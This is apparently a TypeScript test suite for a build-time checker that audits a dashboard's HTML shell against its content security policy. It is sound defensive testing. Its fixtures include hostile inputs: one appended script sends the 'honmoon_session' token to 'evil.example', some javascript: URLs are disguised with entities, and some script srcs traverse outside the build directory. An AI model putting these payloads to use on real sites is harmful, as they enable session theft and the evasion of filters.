import { rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import process from 'node:process'
import { describe, expect, test } from 'bun:test'
import { checkShell, checkShells, REPO_ROOT, scriptFiles } from './check-dashboard-csp'

/** The shape `vite build` emits today: one external module script, one stylesheet. */
const BUILT_SHELL = `<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Honmoon</title>
    <script type="module" crossorigin src="/assets/index-ChyO-qsg.js"></script>
    <link rel="stylesheet" crossorigin href="/assets/index-t0vyplZE.css">
  </head>
  <body>
    <div id="root"></div>
  </body>
</html>
`

/** What `apps/dashboard/demo/build.ts` adds: one relative, same-origin shim tag. */
const DEMO_SHELL = BUILT_SHELL.replace(
  '<script type="module"',
  '<script src="./demo-mode.js"></script>\n    <script type="module"',
)

function details(html: string): string[] {
  return checkShell(html, 'shell').map(problem => problem.detail)
}

describe('checkShell', () => {
  test('the shells the repo actually builds pass', () => {
    expect(checkShell(BUILT_SHELL, 'dist')).toEqual([])
    expect(checkShell(DEMO_SHELL, 'dist-demo')).toEqual([])
  })

  test('an inline <script> body fails — script-src \'self\' refuses it', () => {
    const inlined = BUILT_SHELL.replace(
      '<div id="root"></div>',
      '<div id="root"></div>\n    <script>window.__x = 1</script>',
    )
    expect(details(inlined)).toEqual([
      expect.stringContaining('inline <script> body'),
      expect.stringContaining('<script> with no src'),
    ])
  })

  test('a script from another origin fails', () => {
    const cdn = BUILT_SHELL.replace('/assets/index-ChyO-qsg.js', 'https://cdn.example/app.js')
    expect(details(cdn)).toEqual([expect.stringContaining('<script> loads from off this origin')])
  })

  // The placeholder `crates/honmoon-mgmt/build.rs` writes so a bare `cargo build`
  // works without a dashboard satisfies every other rule vacuously.
  test('a shell with no script at all fails rather than passing vacuously', () => {
    expect(details('<!doctype html><html><body><p>Dashboard not built.</p></body></html>'))
      .toEqual([expect.stringContaining('not a built dashboard shell')])
  })

  test('an inline handler, a <base> and a <form> each fail', () => {
    expect(details(BUILT_SHELL.replace('<div id="root">', '<div onclick="go()" id="root">')))
      .toEqual([expect.stringContaining('inline event handler')])
    expect(details(BUILT_SHELL.replace('<title>', '<base href="/x/" /><title>')))
      .toEqual([expect.stringContaining('<base>')])
    expect(details(BUILT_SHELL.replace('<div id="root"></div>', '<form action="/x"></form>')))
      .toEqual([expect.stringContaining('<form>')])
  })

  // The pair regex is lazy: it skips an opening tag with no `</script>` after
  // it. Before this case existed, an appended unclosed script passed clean while
  // an earlier well-formed tag kept the count non-zero — a silent pass in the
  // one check whose purpose is to not have one.
  test('an unclosed trailing <script> fails rather than going uninspected', () => {
    const appended = `${BUILT_SHELL}<script>\n  fetch('https://evil.example/?c=' + sessionStorage.getItem('honmoon_session'))\n`
    expect(details(appended)).toEqual([expect.stringContaining('no readable `</script>`')])
  })

  // HTML does not honour `<script/>` as self-closing, so its content would run.
  test('a self-closed <script/> is reported as unreadable, not as an unbuilt shell', () => {
    expect(details('<script src="/a.js" />')).toEqual([
      expect.stringContaining('no readable `</script>`'),
    ])
  })

  test('an unquoted inline handler fails — HTML does not require the quotes', () => {
    expect(details(BUILT_SHELL.replace('<div id="root">', '<div onclick=go() id="root">')))
      .toEqual([expect.stringContaining('inline event handler')])
  })

  // `default-src 'none'` governs what the document fetches, not where a link
  // takes the reader — and no directive restricts navigation at all. Failing the
  // build over a working link would be the checker's own "worse than no CSP".
  test('an external <a> link passes — a navigation is not a subresource load', () => {
    const linked = BUILT_SHELL.replace(
      '<div id="root"></div>',
      '<div id="root"></div>\n    <a href="https://honmoon.dev/docs">docs</a>',
    )
    expect(checkShell(linked, 'shell')).toEqual([])
  })

  // The opposite case: <link href> is a fetch, so it stays checked.
  test('an external <link> stylesheet fails — that href is a fetch', () => {
    const cdn = BUILT_SHELL.replace('/assets/index-t0vyplZE.css', 'https://cdn.example/app.css')
    expect(details(cdn)).toEqual([expect.stringContaining('<link> loads from off this origin')])
  })

  test('an unquoted off-origin src fails — HTML does not require the quotes', () => {
    const unquoted = BUILT_SHELL.replace(
      'src="/assets/index-ChyO-qsg.js"',
      'src=https://cdn.example/app.js',
    )
    expect(details(unquoted)).toEqual([expect.stringContaining('<script> loads from off this origin')])
  })

  // The navigation exemption is about a link being a navigation, not a fetch.
  // A `javascript:` URL is neither — it is code, which `script-src 'self'`
  // refuses, so the exemption must not extend to it.
  test('a javascript: href fails even on an <a>, where navigation is exempt', () => {
    const js = BUILT_SHELL.replace(
      '<div id="root"></div>',
      '<div id="root"></div>\n    <a href="javascript:go()">go</a>',
    )
    expect(details(js)).toEqual([expect.stringContaining('javascript: URL')])
  })

  // `[^>]*` would end the tag at the `>` inside the quoted value and never read
  // the attribute after it — a miss, not a finding.
  test('a quoted > inside an attribute does not hide the attributes after it', () => {
    const tricky = BUILT_SHELL.replace(
      '<div id="root"></div>',
      '<div id="root"></div>\n    <link rel="preload" title="a>b" href="https://cdn.example/x.css">',
    )
    expect(details(tricky)).toEqual([expect.stringContaining('<link> loads from off this origin')])
  })

  test('a fragment link is same-document, not an off-origin load', () => {
    expect(details(BUILT_SHELL.replace('<div id="root">', '<a href="#/audit">a</a><div id="root">')))
      .toEqual([])
  })

  // The HTML parser resolves these before anything reads the value as a URL, so
  // a raw-prefix test sees a relative path where the browser sees script.
  test.each([
    ['hex', 'java&#x73;cript:go()'],
    ['decimal', 'java&#115;cript:go()'],
    ['a named colon', 'javascript&colon;go()'],
    ['an embedded tab', 'java\tscript:go()'],
  ])('an entity-hidden javascript: URL (%s) still fails', (_label, href) => {
    const hidden = BUILT_SHELL.replace('<div id="root">', `<a href="${href}">a</a><div id="root">`)
    expect(details(hidden)).toEqual([expect.stringContaining('javascript: URL')])
  })

  // `&sol;` is `/`, so this is a protocol-relative URL to a browser.
  test('a named reference hiding the authority slashes still fails', () => {
    const hidden = BUILT_SHELL.replace(
      '<div id="root">',
      '<link rel="stylesheet" href="&sol;&sol;cdn.example/x.css"><div id="root">',
    )
    expect(details(hidden)).toEqual([expect.stringContaining('<link> loads from off this origin')])
  })

  // `&b=2` is a query separator, not a reference — requiring the `;` is what
  // keeps this rule from failing the build over an ordinary working link.
  test('a query separator is not read as a character reference', () => {
    const query = BUILT_SHELL.replace(
      '<div id="root">',
      '<a href="/audit?from=1&to=2&kind=deny">a</a><div id="root">',
    )
    expect(details(query)).toEqual([])
  })

  // A browser strips the space before reading the scheme, and reads a backslash
  // as a slash in the authority. Deciding either by pattern is what `new URL`
  // is here to stop.
  test.each([
    ['leading whitespace', ' https://cdn.example/app.js'],
    ['a backslash authority', '/\\cdn.example/app.js'],
    ['a protocol-relative URL', '//cdn.example/app.js'],
  ])('an off-origin URL normalised by the browser (%s) fails', (_label, href) => {
    const off = BUILT_SHELL.replace(
      '<div id="root">',
      `<link rel="stylesheet" href="${href}"><div id="root">`,
    )
    expect(details(off)).toEqual([expect.stringContaining('<link> loads from off this origin')])
  })

  // The serving origin is not known at build time, so a URL that names a
  // resolution stand-in must not read as same-origin just because it matches
  // it — and a scheme-bearing reference is relative or absolute depending on
  // the scheme it is served under, which the gateway makes `http`.
  test.each([
    ['naming a stand-in', 'https://dashboard.invalid/x.css'],
    ['scheme-relative to https', 'https:cdn.example/x.css'],
    ['scheme-relative to http', 'http:cdn.example/x.css'],
  ])('an absolute URL (%s) is off-origin wherever the shell is served', (_label, href) => {
    const named = BUILT_SHELL.replace(
      '<div id="root">',
      `<link rel="stylesheet" href="${href}"><div id="root">`,
    )
    expect(details(named)).toEqual([expect.stringContaining('<link> loads from off this origin')])
  })

  // The table is a subset on purpose, so its gaps have to fail rather than pass.
  test('a reference the table does not cover is refused, not passed through', () => {
    const unknown = BUILT_SHELL.replace(
      '<div id="root">',
      '<link rel="stylesheet" href="/assets/&hellip;.css"><div id="root">',
    )
    expect(details(unknown)).toEqual([expect.stringContaining('cannot decode')])
  })

  // `String.fromCodePoint` throws on each of these, which in CI is a stack
  // trace where a finding belongs — and the shell goes unchecked either way.
  test.each([
    ['past the last plane', 'a&#x110000;b'],
    ['a lone surrogate', 'a&#xD800;b'],
    ['a null reference', 'a&#0;b'],
  ])('a malformed numeric reference (%s) does not crash the check', (_label, href) => {
    const malformed = BUILT_SHELL.replace('<div id="root">', `<a href="${href}">a</a><div id="root">`)
    expect(details(malformed)).toEqual([])
  })

  // `&amp;#x73;` is the literal text `&#x73;` in the DOM, not a second
  // reference — decoding twice would invent a finding on a working link.
  // `&amp;hellip;` is one reference the table knows plus the literal text
  // `hellip;` — scanning what the decode left behind would read that back as a
  // second reference and fail the build over a working link.
  test('a doubly-escaped unknown name is text, not an undecodable reference', () => {
    const literal = BUILT_SHELL.replace(
      '<div id="root">',
      '<a href="/audit?q=&amp;hellip;">a</a><div id="root">',
    )
    expect(details(literal)).toEqual([])
  })

  test('a doubly-escaped reference is text, not a scheme', () => {
    const literal = BUILT_SHELL.replace(
      '<div id="root">',
      '<a href="/audit?q=java&amp;#x73;cript">a</a><div id="root">',
    )
    expect(details(literal)).toEqual([])
  })
})

describe('checkShells', () => {
  // `join(REPO_ROOT, '/abs/path')` grafts the argument onto the root and then
  // reports "not found", which reads as a missing build rather than a misread
  // path. The script's own usage line invites an absolute argument.
  test('an absolute path is read as given, not grafted onto the repository root', () => {
    const absolute = join(tmpdir(), `honmoon-csp-shell-${process.pid}.html`)
    writeFileSync(absolute, BUILT_SHELL)
    try {
      expect(checkShells([absolute])).toEqual([])
    }
    finally {
      rmSync(absolute, { force: true })
    }
  })

  test('a missing artifact fails rather than being skipped', () => {
    expect(checkShells(['apps/dashboard/dist/no-such-shell.html']))
      .toEqual([{ shell: 'apps/dashboard/dist/no-such-shell.html', detail: expect.stringContaining('not found') }])
  })
})

// The file set the bundle guard (`check-dashboard-bundle.ts`, #200) reads, taken
// from the very tags this file judges so the two cannot disagree about what
// "the build" is.
describe('scriptFiles', () => {
  const SHELL = 'apps/dashboard/dist/index.html'
  const DIST = join(REPO_ROOT, 'apps/dashboard/dist')

  test('a root-absolute and a relative src both land under the shell\'s own directory', () => {
    expect(scriptFiles(DEMO_SHELL, SHELL)).toEqual({
      files: [join(DIST, 'demo-mode.js'), join(DIST, 'assets/index-ChyO-qsg.js')],
      unresolved: [],
    })
  })

  // `<link href>` is a fetch this file checks, but it is not script, and a
  // `<script>` with no src has no file behind it — both would be a second,
  // wrong idea of what the bundle is.
  test('only <script src> is collected — not a stylesheet, not a srcless tag', () => {
    const extra = BUILT_SHELL.replace('<div id="root"></div>', '<script>window.x = 1</script>')
    expect(scriptFiles(extra, SHELL).files).toEqual([join(DIST, 'assets/index-ChyO-qsg.js')])
  })

  // Reading the file is impossible, so the code it loads goes uninspected. It
  // comes back for the caller to fail on rather than being dropped.
  test('a src with no file behind it is reported, not silently dropped', () => {
    const cdn = BUILT_SHELL.replace('/assets/index-ChyO-qsg.js', 'https://cdn.example/app.js')
    expect(scriptFiles(cdn, SHELL)).toEqual({
      files: [],
      unresolved: [{ src: 'https://cdn.example/app.js', reason: expect.stringContaining('off this origin') }],
    })
  })

  // `new URL` collapses a literal `..` against the origin, so this one lands
  // inside the build directory rather than above it.
  test('a traversing src is collapsed by the URL parser, not followed', () => {
    const up = BUILT_SHELL.replace('/assets/index-ChyO-qsg.js', '../../../etc/passwd')
    expect(scriptFiles(up, SHELL).files).toEqual([join(DIST, 'etc/passwd')])
  })

  // The parser does not percent-decode a path segment, so `%2f` survives it and
  // the decode that follows turns it back into a separator. Relying on the
  // parser alone named a file two levels above `dist/`, same-origin throughout,
  // with both guards green.
  test.each([
    ['an encoded separator', '/assets/..%2f..%2foutside.js'],
    ['an encoded separator, relative', 'a%2f..%2f..%2f..%2foutside.js'],
  ])('a src escaping the build directory (%s) is refused, not read', (_label, src) => {
    const out = BUILT_SHELL.replace('/assets/index-ChyO-qsg.js', src)
    expect(scriptFiles(out, SHELL)).toEqual({
      files: [],
      unresolved: [{ src, reason: expect.stringContaining('outside the build directory') }],
    })
  })

  // An escaped character in a file name is why the decode is there at all, so
  // it must still resolve.
  test('a percent-escaped character in a file name still resolves', () => {
    const spaced = BUILT_SHELL.replace('/assets/index-ChyO-qsg.js', '/assets/a%20b.js')
    expect(scriptFiles(spaced, SHELL).files).toEqual([join(DIST, 'assets/a b.js')])
  })

  // Every reason a `src` can fail to name a file is a hard CI failure in the
  // bundle guard ("the code it loads went uninspected"), so each one has to
  // keep reporting — a refactor that turned any of them into a bare `continue`
  // would let a script through unread with nothing failing.
  test.each([
    ['a javascript: URL', 'javascript:go()', 'inline code rather than a file'],
    ['an undecodable reference', '/assets/&hellip;.js', 'cannot be decoded here'],
    ['a malformed percent-escape', '/assets/%zz.js', 'percent-escape this check cannot decode'],
  ])('a src that names no file (%s) is reported with its own reason', (_label, src, reason) => {
    const bad = BUILT_SHELL.replace('/assets/index-ChyO-qsg.js', src)
    expect(scriptFiles(bad, SHELL)).toEqual({
      files: [],
      unresolved: [{ src, reason: expect.stringContaining(reason) }],
    })
  })

  // `SCRIPT_TAG` is lazy and skips an opening tag with no `</script>`, so its
  // `src` landed in neither list — and a shell whose other tags resolved handed
  // the bundle guard a non-empty file set that passed its anti-vacuity rule
  // while that script's code was never read.
  test('an unclosed <script> is counted, not silently dropped', () => {
    const appended = `${BUILT_SHELL}<script src="/assets/appended.js">`
    expect(scriptFiles(appended, SHELL)).toEqual({
      files: [join(DIST, 'assets/index-ChyO-qsg.js')],
      unresolved: [{ src: null, reason: expect.stringContaining('no readable `</script>`') }],
    })
  })
})
